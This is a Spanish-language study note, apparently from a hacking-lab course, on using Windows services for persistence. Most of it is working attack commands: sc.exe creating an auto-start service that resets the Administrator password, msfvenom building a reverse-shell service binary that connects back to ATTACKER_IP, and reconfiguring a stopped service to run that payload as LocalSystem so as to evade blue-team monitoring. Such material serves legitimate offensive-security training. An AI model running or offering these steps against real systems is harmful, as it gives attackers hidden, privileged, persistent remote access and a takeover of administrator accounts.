---
layout: apunte
title: "4. Abusing Services"
---

Los servicios de Windows ofrecen una buena forma de establecer persistencia ya que pueden ser configurados cuando la máquina de la víctima arranca. Si podemos usar cualquier servicio para que ejecute algo para nosotros, podemos ganar control de la máquina de la víctima cada vez que comience.

Un servicio es básicamente un ejecutable que corre en segundo plano. Cuando configuramos un servicio, definimos qué ejecutable será usado y seleccionamos si el servicio se auto-ejecutará al arrancar la máquina o no.

Hay dos formas principales en las que podemos abusar servicios para establecer persistencia: o creamos un nuevo servicio o modificamos uno existente.

--------------------------------------
<h2>Crear Servicios de Backdoor</h2>
Podemos crear y comenzar un servicio llamado "THMservice" usando los siguientes comandos:

```batch
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

>[!NOTE] Debe haber un espacio después de cada signo de igual para que el comando funcione.

El comando `net user` será ejecutado cuando el servicio arranca, reconfigurando la contraseña de `Administrator` a `Passwd123`. Fíjate que el servicio ha sido configurado para arrancar automáticamente (`start= auto`).

Reconfigurar una contraseña de usuario funciona suficientemente bien pero también podemos crear una reverse shell con `msfvenom` y asociarla al servicio creado. Ten en cuenta, sin embargo, que los servicios ejecutables son únicos ya que necesitan implementar un protocolo particular para ser manejados por el sistema. Si quieres crear un ejecutable que sea compatible con los servicios Windows, puedes usar el formato `exe-service` en `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

Luego, puedes copiar el ejecutable a tu sistema, digamos en `C:\Windows` y apuntar el `binPath` del servicio ahí:

```batch
sc.exe create THMservice2 binPath= "C:\Windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

-----------------------------------
<h2>Modificar Servicios Existentes</h2>
Mientras que crear servicios nuevos para la persistencia funciona bastante bien, el blue team puede monitorizar la creación de nuevos servicios a lo largo de la red. Puede que queramos reutilizar un servicio existente en lugar de crear uno nuevo para evitar la detección. Normalmente, cualquier servicio deshabilitado sería un buen candidato ya que podría ser alterado sin que el usuario lo notase.

Puedes obtener una lista de servicios disponibles usando el comando:

```batch
C:\> sc.exe query state=all
SERVICE_NAME: THMService1
DISPLAY_NAME: THMService1
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Deberías ser capaz de encontrar un servicio stopped llamado THMService3. Para hacer la query acerca de la configuración del servicio, puedes usar el siguiente comando:

```batch
C:\> sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMService3
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```

Hay tres cosas que importan cuando usamos servicios para persistencia:

- El ejecutable (**BINARY_PATH_NAME**) debería apuntar a nuestro payload.
- El servicio **START_TYPE** debería ser automático para que el payload se ejecute sin interacción del usuario.
- El **SERVICE_START_NAME**, el cual es la cuenta bajo la cual es servicio corre, debería ser preferentemente **LocalSystem** para obtener privilegios SYSTEM.

Vamos a comenzar creando una nueva reverse shell con `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

Para reconfigurar los parámetros de "THMservice3", podemos usar el siguiente comando:

```batch
C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

Luego puedes volver a consultar la configuración del servicio para asegurarte de que todo está correcto:

```batch
C:\> sc.exe qc THMservice3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

